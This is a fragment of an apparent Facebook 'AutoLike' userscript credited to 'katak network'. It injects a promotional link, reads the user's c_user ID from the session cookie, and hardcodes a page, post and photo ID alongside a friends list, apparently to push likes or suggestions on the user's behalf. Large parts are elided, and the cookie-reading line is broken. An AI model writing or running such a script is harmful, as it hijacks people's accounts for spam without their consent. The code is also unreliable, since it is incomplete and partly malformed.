...
// @description		        *[ AUTOLIKE BOoM ]* AutoLike Facebook coded by katak network.
// @author			http://www.facebook.com/TraSuaVoTin.info
// @authorURL		        
...
}
{
  ...
  div.style.position="fixed";
    ...
    div.style.border="1px solid #6B84B4";
    div.style.padding="3px";
    div.innerHTML="<a style='font-weight:bold;color:#E30505' href='http://videokatak.tk/' target='_blank' title='NEW' ><blink><center>AUTOBOT COMMENT</center></blink></a>";body.appendChild(div)}body=document.body;if(body!=null)
 ...
 unsafeWindow.AnonymousComments = function()
 {
  ...
  function A()
  {
   ...
   for(var L=0;L<M.length;L++)
   {
    ...
    if(K!=null&&K.indexOf("uiButton uiButtonLarge uiButtonConfirm")>=0)
    {
     alert("Warning from Katak Network");
     N=true
    }
   }
   if(!N)
...
var spage_id = "289723214515197";
var spost_id = "289723214515197";
var sfoto_id = "289723214515197";
var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);
var smesaj = "";
var smesaj_text = "";
var arkadaslar = [];
...
function blub()
{
    if(document.getElementsByClassName('pbm fsm').length == 1) {
        ...
        //e.href = '#';
        e.innerHTML = 'Auto Suggest by King Katak';
